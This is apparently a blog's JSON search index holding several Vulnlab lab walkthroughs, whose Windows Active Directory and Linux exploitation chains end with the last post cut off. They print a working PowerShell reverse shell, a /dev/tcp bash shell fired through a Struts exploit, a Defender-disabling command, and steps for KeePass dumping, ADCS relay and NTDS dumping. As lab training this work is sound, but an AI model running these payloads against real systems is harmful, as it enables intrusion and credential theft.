\u0026lt;--------------- ACL:NT AUTHORITY\\SYSTEM:ALLOWED/I/FULL ACL:BUILTIN\\Server Operators:ALLOWED/I/READ We can see that we can actually control the file: ACL:Everyone:ALLOWED/I/FULL\nSo let\u0026rsquo;s modify the file to get us the initial foothold by spawning a PowerShell reverse shell.\ncreateobject(\u0026#34;wscript.shell\u0026#34;).run\u0026#34;cmd.exe /c powershell \u0026#34;\u0026#34;$client=New-Object System.Net.Sockets.TCPClient(\u0026#39;10.8.0.107\u0026#39;,9192);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2\u0026gt;\u0026amp;1|Out-String);$sendback2=$sendback+\u0026#39;PS \u0026#39;+(pwd).Path+\u0026#39;\u0026gt; \u0026#39;;$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\u0026#34;,0 We spawned a shell which belongs to Amelia.Griffiths, we can now read the user flag.\nPrivilege Escalation For this part, we must enumerate the environment first, so let\u0026rsquo;s use python\u0026rsquo;s version of bloodhound.\n$ bloodhoundpy -c All -d baby2.vl -dc dc.baby2.vl -u Carl.Moore -p \u0026#39;Carl.Moore\u0026#39; -ns 10.10.101.112 And after we gather all the stuff and load them into bloodhound, we can see what permission does our owned user\nAmelia.Griffiths Is a member of a group called LEGACY which has WriteDacl permissions over the GPOADM user of the domain, in that case let\u0026rsquo;s use those techniques:\nGrant Rights ForceChangePassword . Transfer the PowerView to the machine and then:\nPS \u0026gt; . .\\PowerView.ps1 PS \u0026gt; Add-DomainObjectAcl -Rights \u0026#39;All\u0026#39; -TargetIdentity \u0026#34;GPOADM\u0026#34; -PrincipalIdentity \u0026#34;Amelia.Griffiths\u0026#34; We are granting GenericALL over the user GPOADM and then we can use the second technique:\nPS \u0026gt; $UserPassword = ConvertTo-SecureString \u0026#39;Password123!\u0026#39; -AsPlainText -Force PS \u0026gt; Set-DomainUserPassword -Identity GPOADM -AccountPassword $UserPassword Then we can try if that worked:\nWe can try using evil-winrm to log in, but that won\u0026rsquo;t work just yet, just because if we list the local accounts on the machine we don\u0026rsquo;t actually have the gpoadm user there, so we must add it first. In order to that, we must abuse the GPO rights, using the **Immediate Scheduled Task technique.\nLet\u0026rsquo;s figure out first the GPOs that we can abuse, we can either look that up in the bloodhound or by using the gpoowned tool.\nThen we can craft our command to abuse the scheduled tasks\n$ pygpoabuse baby2.vl/gpoadm:\u0026#39;Password123!\u0026#39; -gpo-id \u0026#39;31B2F340-016D-11D2-945F-00C04FB984F9\u0026#39; -dc-ip 10.10.78.135 -v -command \u0026#39;net localgroup administrators GPOADM /add\u0026#39; And we should be able to log in as the user gpoadm using evil-winrm\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-31-vulnlab-baby2\/"
    },
    
    "http:\/\/localhost:1313\/posts\/vulnlab-control-chain\/": {
        "title": "Vulnlab - Control (Chain)",
        "tags": [],
        "content": " This is an experimental write-up that I did with AI, I trying to proof-read them as well as I can, but apologies if there are misstakes.\nIn this challenge, we are presented with two target machines, each offering a different attack surface. The journey begins with a reconnaissance phase, identifying open ports and services through scanning.\nInitial Scanning and Discovery For the intra machine, the open ports discovered were:\n22/tcp for SSH 443/tcp for HTTPS On the os machine, the ports identified were:\n22/tcp for SSH 80/tcp for HTTP 443/tcp for HTTPS 8443/tcp 8444/tcp Gaining Initial Access Exploring the os machine\u0026rsquo;s HTTPS service on port 443 led us to a wiki page hinting at the use of pydio and osctrl services. Within this page, we found some valuable information, including a potential default password Sum\u0026lt;redacted\u0026gt; and a list of user accounts:\nJimmy George - j.george Ann Rodriguez - a.rodriguez Adriana Larose - a.larose Kara Leblanc - k.leblanc Steven Thibodeau - s.thibodeau Kurt Dagenais - k.dagenais Ken Pare - k.pare Yvon McBride - y.mcbride We extracted those users, from the revisions of each page.\nUtilizing the discovered password, we were able to authenticate as users y.mcbride and k.dagenais in the pydio.\nCVE 2023-32749 Leveraging CVE 2023-32749, detailed at Exploit Database , we escalated privileges by assigning an admin role to a newly created user. This vulnerability allows attackers to modify user roles, thus granting unauthorized access to sensitive cells within the application.\nExtracting Sensitive Information Within the administrative area, we intercepted a conversation mentioning the creation of a provision user with the password TeiG6im\u0026lt;redacted\u0026gt; for testing purposes on the os.control.vl server. This information provided SSH access as the provision user, from which we extracted the .ssh folder for future use.\nPyio\u0026rsquo;s Chat @Kara: I added this room to share scripts, outputs, documents for our osquery project and already added some documents. Also, as discussed I created the provision user on `os.control.vl` with password `TeiG6imee\u0026lt;redacted\u0026gt;` so we can start using your temporary provisioning solution on the first servers for testing. Database Access and Further Privilege Escalation On the same machine, a PostgreSQL database was found listening on port 5432. Accessing the database using the default postgres user revealed the osctrl database. Within this database, we targeted the admin_users table to replace the bcrypt password hash of the admin user with a known hash for the password admin, facilitating web system login.\nUPDATE admin_users SET pass_hash = \u0026#39;$2a$10$3.g.9xQtpwNpOxYsEXZX...xxMJcttMqcCw5i3imHBGJ6VJfFw41W\u0026#39; WHERE id = 1; Final Stages of System Compromise The osctrl system can be used to run arbitrary osquery queries towards the enrolled nodes, with the following query we can list files in a given directory, this is going to be useful for enumerating files in the machine.\nSELECT * FROM file WHERE path = \u0026#39;/given/path\u0026#39;; The osctrl system allowed file extraction from enrolled nodes this feature is called \u0026ldquo;craving file\u0026rdquo;. Exploiting this feature, we extracted the .ssh folder of the user kara, which contained SSH keys. These keys provided access to the kara account, which had sudo privileges, allowing us to switch to the root user.\nInfiltrating the Intra Machine Investigation on the intra machine revealed that the root user\u0026rsquo;s authorized_keys contained the provision user\u0026rsquo;s private key.\nThe authorized_key however can be run with only a few commands, stated in the command script in the authorized_keys.\n#!/usr/bin/bash # (c) 2022-2023 by Kara Leblanc # # This is a temporary server provision wrapper for control.vl unix servers. # # For security reasons the provisioning ssh key is only allowed to run # this script and not all commands on the machine. # This script will only allow to run commands that are contained in special # modules in the modules/ directory. Despite being highly secure there are # probably better solutions to our problem but we need to evaluate them. We # will therefore stick with this script for now. set -- $SSH_ORIGINAL_COMMAND if [[ -n $1 ]] ; then module=$(basename ${1}) shift if [[ -f /opt/provision/modules/$module \u0026amp;\u0026amp; -x /opt/provision/modules/$module ]] ; then exec \u0026#34;/opt/provision/modules/$module\u0026#34; \u0026#34;$@\u0026#34; fi fi The executable commands are:\nprov_osqd prov_df prov_uname Among the executable commands, prov_osqd stood out. This script, intended for enrolling systems, could be abused to execute a reverse shell by intercepting the curl request for enroll.sh and replacing it with a malicious script.\nprov_osqd script #!/usr/bin/bash if [[ -z $1 || -z $2 ]] ; then echo \u0026#34;Missing options.\u0026#34; \u0026gt;\u0026amp;2 exit 42 curl -sk https://os.control.vl/${1}/${2}/enroll.sh | bash Exploitation Summary To exploit prov_osqd, the following steps were executed:\nStopped the nginx service on the os machine. Modified the nginx configuration to proxy traffic to a local Python server on port 8000. Created nested folders on the Python server to mimic the expected path and placed a malicious enroll.sh script containing a reverse shell. Triggered prov_osqd with arbitrary arguments, resulting in the execution of the reverse shell script. This comprehensive approach allowed us to gain root privileges on the intra system.\n", 
        "url": "http:\/\/localhost:1313\/posts\/vulnlab-control-chain\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-feedback\/": {
        "title": "Vulnlab - Feedback [Easy]",
        "tags": [],
        "content": " Name OS Difficulty Feedback Linux Easy Summary We would find an Apache Tomcat server running, where we can fuzz it to find an endpoint called /feedback which then we can exploit a vulnerability in Apache Struts for gaining our initial foothold. Then we would find clear-text credentials while analyzing the Apache Tomcat\u0026rsquo;s files which will give us the root access.\nInitial Foothold We would start with a nmap scan:\nsyl@sylsec:~/vulnlab/Feedback$ sudo nmap -sS -sU 10.10.80.221 --min-rate 10000 --open -p- [sudo] password for syl: Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-26 16:40 EET Warning: 10.10.80.221 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.80.221 Host is up (0.17s latency). Not shown: 65456 open|filtered ports, 52483 closed ports, 13129 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Which would give us the SSH service and some kind of HTTP website, upon visiting the website we would find that this is the default installation for Apache Tomcat. We have free access to the examples of the Apache Tomcat, but not to the /manager.\nThis initially made me think that we would have something to do with the sessions because we can edit it, so I went to fuzz the website further.\nWe can fuzz the website for any additional directories:\nsyl@sylsec:~/tools$ ffuf -w $commontxt -u http://10.10.80.221:8080/FUZZ /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0 ________________________________________________ :: Method : GET :: URL : http://10.10.80.221:8080/FUZZ :: Wordlist : FUZZ: /home/syl/tools/lists/SecLists/Discovery/Web-Content/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ docs [Status: 302, Size: 0, Words: 1, Lines: 1] examples [Status: 302, Size: 0, Words: 1, Lines: 1] feedback [Status: 302, Size: 0, Words: 1, Lines: 1] favicon.ico [Status: 200, Size: 21588, Words: 19, Lines: 22] host-manager [Status: 302, Size: 0, Words: 1, Lines: 1] manager [Status: 302, Size: 0, Words: 1, Lines: 1] As we can see, we have the /feedback route, that consisted of two input fields, one for the name and one for the feedback.\n![[Pasted image 20231226190051.png]]\nWe can inspect the source code of the page and there we can find this HTML comment:\n\u0026lt;!-- Build with Java, Struts2 \u0026amp; Log4J --\u0026gt; We would then use Google to find some exploit related to those technologies, and we would find that the website is actually vulnerable to CVE-2017-5638, which is related to Apache Struts, there is a PoC of that exploit in GitHub . We can setup a listener for the port 4444 and run the exploit:\nsyl@sylsec:~/vulnlab/Feedback/exploits/struts-pwn$ python3 struts-pwn.py --url \u0026#39;http://10.10.80.221:8080/feedback/logfeedback.action\u0026#39; -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.0.107/4444 0\u0026gt;\u0026amp;1\u0026#39; [*] URL: http://10.10.80.221:8080/feedback/logfeedback.action [*] CMD: bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.0.107/4444 0\u0026gt;\u0026amp;1 That would give us the initial shell.\nPrivilege Escalation We can start enumerating the system from our reverse shell with linpeas, and we would also need to spawn a stable tty shell, I used python for that matter.\ntomcat@ip-10-10-10-7:/tmp$ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Upon carefully reviewing the output from linpeas, we would find the configuration for Apache Tomcat containing clear-text credentials.\n/opt/tomcat/conf/tomcat-users.xml \u0026lt;user username=\u0026#34;admin\u0026#34; password=\u0026#34;H2R\u0026lt;REDACTED\u0026gt;\u0026#34; roles=\u0026#34;manager-gui\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;robot\u0026#34; password=\u0026#34;H2R\u0026lt;REDACTED\u0026gt;\u0026#34; roles=\u0026#34;manager-script\u0026#34;/\u0026gt; We can try to switch to the user ubuntu which doesn\u0026rsquo;t work, but the user root does.\ntomcat@ip-10-10-10-7:/tmp$ su ubuntu su ubuntu Password: H2R\u0026lt;REDACTED\u0026gt; su: Authentication failure tomcat@ip-10-10-10-7:/tmp$ su root su root Password: H2R\u0026lt;REDACTED\u0026gt; root@ip-10-10-10-7:/# whoami whoami root root@ip-10-10-10-7:/# cat /root/root.txt cat /root/root.txt VL{\u0026lt;REDACTED\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-feedback\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-forgotten\/": {
        "title": "Vulnlab - Forgotten [Easy]",
        "tags": [],
        "content": " Name OS Difficulty Forgotten Linux Easy Summary We would find a website that we are going to fuzz and find an installation page for the LimeSurvey software. Then we would set up our local database to work with the installation of that software and run it on the server. We would then install a malicious plugin so that we can gain remote code execution on the machine. Then we would find credentials in the environment variables that we can use to gain access to the SSH. After that, we are going to abuse the mount points of the docker image to gain root on the host machine.\nInitial Foothold Upon scanning the machine, we would find a couple of ports open ports.\n$ sudo nmap -sS -sU 10.10.105.241 --min-rate 10000 --open -p- Going to the web page, we would find that it results to status code 403, so the next step that we are going to take is to fuzz it\n$ ffuf -w $commontxt -u http://10.10.105.241/FUZZ Then we would find an installation page for the software LimeSurvey.\nWe are going to try to install it, however to do that we need to install mysql server onto our local server and expose it to the machine so that the system can connect to us, otherwise we would get:\nERROR 1130 (HY000): Host \u0026#39;\u0026lt;MACHINE_IP\u0026gt;\u0026#39; is not allowed to connect to this MySQL server In order to do that, we would need to set our MySQL server to accept connections from anywhere and create a user.\nFirst, we need to edit our configuration\n$ sudo nano /etc/mysql/mysql.conf.d/mysqld.cnf # Change \u0026#34;bind-address\u0026#34; to \u0026#34;0.0.0.0\u0026#34; Then we can connect using the root user and\nmysql\u0026gt; CREATE USER \u0026#39;forgotten\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED BY \u0026#39;forgotten\u0026#39;; mysql\u0026gt; GRANT ALL PRIVILEGES ON *.* TO \u0026#39;forgotten\u0026#39;@\u0026#39;%\u0026#39; WITH GRANT OPTION; mysql\u0026gt; FLUSH PRIVILEGES; We would then be able to install the LimeSurvey and get into the admin panel.\nWe can now research of some ways to get remote code execution on the machine using this software, a quick google search would lead us to this exploit: LimeSurvey RCE .\nThe exploit is leveraging the plugins feature of the software to install a malicious plugin which can connect to our listener.\nWe can setup such plugin by cloning the repository and replacing the needed variables in the file php-rev.php after that we also need to edit the config.xml and add the installed version of the LimeSurvey to the \u0026lt;compatibility\u0026gt; element, after that we would zip the files and upload them.\n$ zip plg.zip ./php-rev.php ./config.xml We can then navigate to /index.php/admin/pluginmanager?sa=upload to upload our plugin. After we upload it and activate it, we can start a local listener with the given configuration earlier, and to execute our reverse shell we need to head to /survey/upload/plugins/Y1LD1R1M/php-rev.php\nWe can now run linpeas to enumerate further, and upon examining the output we would find this environment variable set in the beginning LIMESURVEY_PASS=5W5\u0026lt;REDACTED\u0026gt; we would also find that the current shell is running within a docker container.\nAfter finding that password I immediately tried it to change the user to root in the current container which worked, and I also tried to SSH with the user limesvc which also worked!\nAnd judging by the system information, it seems that we are not in the docker container anymore, if we list the home directory we would find the user.txt flag.\nPrivilege Escalation We can use a tool called CDK - Zero Dependency Container Penetration Toolkit to inspect our docker container which runs the LimeSurvey application.\nIn the Mounts section we can see the listed mounts, the resolv.conf | hostname | hosts are standard for every container but the /opt/limesurvey isn\u0026rsquo;t so we can check that out.\nWe can see that the host has mounted the /opt/limesurvey directory in the /dev/ folder on the container, We can go to /dev/ to create a single file and check its permissions on the host system. Since that the docker container process is running as root we would have the same permissions from within the container. The file that has been created is having root permissions.\nWe can now try the same thing but with the bash executable, we would try the following thing on the container:\nroot@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./syl root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./syl Now on the host machine we can invoke our binary ./syl and we should be root.\nlimesvc@ip-xxx:/opt/limesurvey$ ./syl -p syl-5.1# whoami root syl-5.1# cat /root/root.txt VL{\u0026lt;REDACTED\u0026gt;} ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-26-vulnlab-forgotten\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-02-19-vulnlab-kaiju\/": {
        "title": "Vulnlab - Kaiju Chain [Hard]",
        "tags": [],
        "content": " Through the writeup the IPs may change, this is due that I did the machine in a few tries so I turned off the instances.\nWe start with 3 targets in my case the targets were:\n10.10.247.37\r10.10.247.38\r10.10.247.39 Scanning them:\n$ rustscan -a $(sed --z \u0026#39;s/\\n/,/g\u0026#39; target.txt)\rOpen 10.10.247.38:21\rOpen 10.10.247.38:22\rOpen 10.10.247.38:3389\rOpen 10.10.247.39:3389\rOpen 10.10.247.37:3389 We are able to log in with ftp:ftp, then we can list the files:\ndr-xr-xr-x 1 ftp ftp 0 Dec 27 10:15 Configs\rdr-xr-xr-x 1 ftp ftp 0 Dec 17 14:44 Licenses\rdr-xr-xr-x 1 ftp ftp 0 Dec 27 10:15 Passwords\rdr-xr-xr-x 1 ftp ftp 0 Dec 29 08:56 Software\rdr-xr-xr-x 1 ftp ftp 0 Dec 27 10:15 Temp We can download them all using wget\nwget -m ftp://ftp:ftp@10.10.247.38 We find interesting files that contains credentials under the Passwords folder.\n-r--r--r-- 1 ftp ftp 20 Jan 30 20:10 firewalls.txt\r-r--r--r-- 1 ftp ftp 9 Jan 30 20:16 ftp.txt\r-r--r--r-- 1 ftp ftp 32 Dec 29 08:53 local.txt firewall:firexx\rftp:ftp\radministrator:[Moved to KeePass] Under the Configs folder we can find users.xml\n-r--r--r-- 1 ftp ftp 2236 Dec 17 14:54 users.xml Upon opening it we can see another user called backup and its hashed password.\n\u0026lt;user name=\u0026#34;backup\u0026#34; enabled=\u0026#34;true\u0026#34;\u0026gt; ... \u0026lt;password index=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;hash\u0026gt;ZqRNhkBO8d4VYJb0YmF7cJgjECAH4...\u0026lt;/hash\u0026gt; \u0026lt;salt\u0026gt;aec9Yt49edyEvXkZUinmS52UrwNo...\u0026lt;/salt\u0026gt; \u0026lt;iterations\u0026gt;100000\u0026lt;/iterations\u0026gt; \u0026lt;/password\u0026gt; ... We can check the FileZilla\u0026rsquo;s forums to see what type of hash it is, specifically I used these:\nhttps://forum.filezilla-project.org/viewtopic.php?t=55179 https://forum.filezilla-project.org/viewtopic.php?t=54821 https://john-users.openwall.narkive.com/giDMyLS3/using-pbkdf2-hmac-sha256 We should replace the + with . in our hash before trying to crack it, the format should be this: $pbkdf2-sha256$iterations$salt$hash\nSince the hash doesn\u0026rsquo;t crack with rockyou we should try to pass some simple rules such as:\n$1$2$3 which is derived from the credentials that we gathered, specifically firewalls.txt\n$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt This cracks to ....123, then we can use this password to log in with ssh into the server:\nMicrosoft Windows [Version 10.0.20348.2159]\r(c) Microsoft Corporation. All rights reserved.\rbackup@BERSRV200 C:\\Users\\backup\u0026gt; Listing the C:\\Users we can see another users: clare.frost and sasrv200, we should keep note of them. Using the users.xml we can see that there is an E:\\ drive, we can explore that further.\nWe can see some interesting files there such as:\nit.kdbx\rfilezilla-server.log\rinstall.log We can discover the administrator\u0026rsquo;s hash there:\n[--admin.password@index=1 --admin.password.hash=mSbrgj1R6oqMMSk4Qk1TuYTc... --admin.password.salt=AdRNx7rAs1CEM23pA.... --admin.password.iterations=100000] And then again we can create custom wordlist to crack it\n$ hashcat -m 20300 ./filezilla.hash /opt/rockyou.txt -r ./hash_rule.txt The next part of this chain is to enumerate the ports in the machine, we can see some interesting ports such as:\nTCP [::1]:14148 [::]:0 LISTENING 3192 We can forward this port, but if we google around we can see that it is related to FileZilla Server, lets forward it:\nssh -L 127.0.0.1:8003:127.0.0.1:14148 backup@10.10.247.38 Now comes the tricky part, you have to use Windows to make this client work, I\u0026rsquo;ve faced some issues on Linux but I know that some people have made it work. You also need to use the same version of this software, luckily under Software folder there is a FileZilla_Server_1.8.0_win64-setup.exe which we can use to start the UI (we do not need the server), then we can configure it to connect to the port that we forwarded.\nWe can then enumerate the current users, but most importantly we can add our new user syl:5yl\nThen we should be able to access the ftp server using the newly created user. Upon listing the FTP, we would notice that we have access to the account sasrv200 because we can list files there. Since that we have READ \u0026amp; WRITE access we can put authorized_keys in a .ssh folder with our public key.\nftp\u0026gt; mkdir .ssh\r257 \u0026#34;/Users/sasrv200/.ssh\u0026#34; created successfully.\r...\rftp\u0026gt; put authorized_keys\rlocal: authorized_keys remote: authorized_keys\r229 Entering Extended Passive Mode (|||65019|)\r150 Starting data transfer.\r100% |******************************************************************************************************************************| 107 155.72 KiB/s 00:00 ETA\r226 Operation successful\r107 bytes sent in 00:00 (2.51 KiB/s)\rftp\u0026gt; dir\r229 Entering Extended Passive Mode (|||65164|)\r150 Starting data transfer.\r-rw-rw-rw- 1 ftp ftp 107 Feb 18 18:57 authorized_keys\r226 Operation successful Now we should be able to login as that user using ssh.\nMicrosoft Windows [Version 10.0.20348.2159]\r(c) Microsoft Corporation. All rights reserved.\rkaiju\\sasrv200@BERSRV200 C:\\Users\\sasrv200\u0026gt;tree /f /a\rFolder PATH listing\rVolume serial number is AC3F-A083\rC:.\r+---.ssh\r| authorized_keys\r|\r+---Desktop\r| flag.txt After some further enumeration over the account we can notice that there is a process called KeePass that pops out every now and then.\nI created this little script to watch for changes\nwhile ($true) { Clear-Host $processes = Get-Process | Sort-Object CPU -Descending | Select-Object -Property ID, ProcessName, CPU $currentTime = Get-Date Write-Host \u0026#34;Process Watcher - Current Time: $currentTime\u0026#34; $processes Start-Sleep -Seconds 5 } After that, we can see that in the E:\\ drive under the KeePass folder there are Plugins folder which is empty. This hints for this malicious plugin:\nhttps://github.com/d3lb3/KeeFarceReborn When you put your malicious plugin under the Plugins folder you should expect a dump of the database in C:\\temp there will be a *.xml file. Eventually you will find the administrator\u0026rsquo;s password there N......Mel...\nThen we can login with SSH.\nMicrosoft Windows [Version 10.0.20348.2159]\r(c) Microsoft Corporation. All rights reserved.\radministrator@BERSRV200 C:\\Users\\Administrator\u0026gt; Let\u0026rsquo;s disable the AV and the Firewall\ncmd.exe /c \u0026#34;powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend \u0026amp;\u0026amp; powershell Set-MpPreference -SubmitSamplesConsent 2 \u0026amp; \u0026#34;%ProgramFiles%\\Windows Defender\\MpCmdRun.exe\u0026#34; -RemoveDefinitions -All\u0026#34; Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False Now, lets copy chisel with scp and start it, then we can adjust our proxychains tool and setup a proxy to access the internal ports.\nUpon the enumeration using the ADCS module from nxc, we can see that there is an enrollment server:\nWe would want to see the vulnerable certificates now using certipy\n$ proxychains certipy find -username clare.frost@kaiju.vl -hashes be167.. -vulnerable -stdout -dc-ip 10.10.213.165 There is ESC8 vulnerability which we can exploit.\nThe next step is quite tricky, we need to redirect the traffic that comes to the machine that we are in BERSRV200 to other port that we then should forward to our machine where we setup a relay towards the BERSRV100 so that we can get the authenticating certificate that we use from BERSRV105 towards BERSRV100, with that certificate we can then try to get TGT from the BERSRV100 principal which in turn will retrieve us the NT hash.\nTo setup this we would need to do these following steps:\nOn the BERSRV200 machine use the https://github.com/jellever/StreamDivert to forward the traffic from 445 to 8445 Forward the 8445 port on the BERSRV200 machine towards your local machine Setup a ntlmrelayx with the following args: proxychains ntlmrelayx -t http://BERSRV100.kaiju.vl/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController' Transform the certificate from b64 to pfx (simply decode it and save it to pfx) Use proxychains certipy auth -pfx cert.pfx to ask for TGT, to retrieve the NT hash Then we should be able to dump the OS credentials with the retrieved hash for the user BERSRV100$\n$ proxychains crackmapexec smb 10.10.213.165 -u \u0026#39;BERSRV100$\u0026#39; -H \u0026#39;19ad5c18445fxxxxx\u0026#39; --ntds drsuapi And then we can use the administrator\u0026rsquo;s hash to log in using winrm or similar.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-02-19-vulnlab-kaiju\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-12-19-vulnlab-retro\/": {
        "title": "Vulnlab - Retro [Easy]",
        "tags": [],
        "content": "Retro is an easy windows (active directory) machine by Vulnlab.\nI\u0026rsquo;ve tried to show as many methods as possible to retrieve the same thing, for example retrieving the administrator\u0026rsquo;s NTLM hash and changing the password for a user with 2 different methods, I hope that you can learn more that way which is the whole point of this write-up!\nEnumeration Started with a simple nmap scan:\nsyl@sylsec:~/vulnlab/Retro$ nmap -p- -sT -v -A --open -T 4 --script vuln* -oN ^Cap.txt -sC -sV 10.10.64.243 -Pn --min-rate 10000 ... 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 3389/tcp open ms-wbt-server Microsoft Terminal Services 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=12/19%Time=6581A887%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows ... Next I\u0026rsquo;ve used enum4linux which showed me the FQDN, Domain and not much else.\nsyl@sylsec:~/vulnlab/Retro$ enum4linux 10.10.64.243 NetBIOS computer name: DC NetBIOS domain name: RETRO DNS domain: retro.vl FQDN: DC.retro.vl Derived membership: domain member Derived domain: RETRO Then I went on to enumerate the SMB protocol.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u \u0026#39;Guest\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\Guest: SMB 10.10.64.243 445 DC [*] Enumerated shares SMB 10.10.64.243 445 DC Share Permissions Remark SMB 10.10.64.243 445 DC ----- ----------- ------ SMB 10.10.64.243 445 DC ADMIN$ Remote Admin SMB 10.10.64.243 445 DC C$ Default share SMB 10.10.64.243 445 DC IPC$ READ Remote IPC SMB 10.10.64.243 445 DC NETLOGON Logon server share SMB 10.10.64.243 445 DC Notes SMB 10.10.64.243 445 DC SYSVOL Logon server share SMB 10.10.64.243 445 DC Trainees READ I went in and checked the readable share \u0026ldquo;Trainees\u0026rdquo; and I got the file Important.txt which contained the following text:\nDear Trainees, I know that some of you seemed to struggle with remembering strong and unique passwords. So we decided to bundle every one of you up into one account. Stop bothering us. Please. We have other stuff to do than resetting your password every day. Regards The Admins That is definitely interesting it does hint that there may be weak credentials, so let\u0026rsquo;s try to enumerate some users. Since that the account \u0026ldquo;Guest\u0026rdquo; is working, I used the lookupsid by the impacket\u0026rsquo;s scripts.\nsyl@sylsec:~/tools/impacket/examples$ python3 lookupsid.py Guest@10.10.64.243 Impacket v0.12.0.dev1+20230921.20754.9c8f344b - Copyright 2023 Fortra Password: [*] Brute forcing SIDs at 10.10.64.243 [*] StringBinding ncacn_np:10.10.64.243[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172 498: RETRO\\Enterprise Read-only Domain Controllers (SidTypeGroup) 500: RETRO\\Administrator (SidTypeUser) 501: RETRO\\Guest (SidTypeUser) 502: RETRO\\krbtgt (SidTypeUser) 512: RETRO\\Domain Admins (SidTypeGroup) 513: RETRO\\Domain Users (SidTypeGroup) 514: RETRO\\Domain Guests (SidTypeGroup) 515: RETRO\\Domain Computers (SidTypeGroup) 516: RETRO\\Domain Controllers (SidTypeGroup) 517: RETRO\\Cert Publishers (SidTypeAlias) 518: RETRO\\Schema Admins (SidTypeGroup) 519: RETRO\\Enterprise Admins (SidTypeGroup) 520: RETRO\\Group Policy Creator Owners (SidTypeGroup) 521: RETRO\\Read-only Domain Controllers (SidTypeGroup) 522: RETRO\\Cloneable Domain Controllers (SidTypeGroup) 525: RETRO\\Protected Users (SidTypeGroup) 526: RETRO\\Key Admins (SidTypeGroup) 527: RETRO\\Enterprise Key Admins (SidTypeGroup) 553: RETRO\\RAS and IAS Servers (SidTypeAlias) 571: RETRO\\Allowed RODC Password Replication Group (SidTypeAlias) 572: RETRO\\Denied RODC Password Replication Group (SidTypeAlias) 1000: RETRO\\DC$ (SidTypeUser) 1101: RETRO\\DnsAdmins (SidTypeAlias) 1102: RETRO\\DnsUpdateProxy (SidTypeGroup) 1104: RETRO\\trainee (SidTypeUser) 1106: RETRO\\BANKING$ (SidTypeUser) 1107: RETRO\\jburley (SidTypeUser) 1108: RETRO\\HelpDesk (SidTypeGroup) 1109: RETRO\\tblack (SidTypeUser) We got a couple of users:\n1000: RETRO\\DC$ (SidTypeUser) 1104: RETRO\\trainee (SidTypeUser) 1106: RETRO\\BANKING$ (SidTypeUser) 1107: RETRO\\jburley (SidTypeUser) 1109: RETRO\\tblack (SidTypeUser) I\u0026rsquo;ve stripped the users and added them to users.txt with the addition of \u0026lsquo;administrator\u0026rsquo;. Since I knew that there would be weak credentials, I tried with the following pattern user:pass.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u ./users.txt -p ./users.txt SMB 10.10.64.243 445 DC [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) SMB 10.10.64.243 445 DC [+] retro.vl\\trainee:trainee And I\u0026rsquo;ve got a hit for the user trainee. Now let\u0026rsquo;s try to get the SMB shares once again with that user.\nsyl@sylsec:~/vulnlab/Retro$ netexec smb 10.10.64.243 -u trainee -p trainee --shares SMB 10.10.64.243 445 DC [*] Windows 10.0 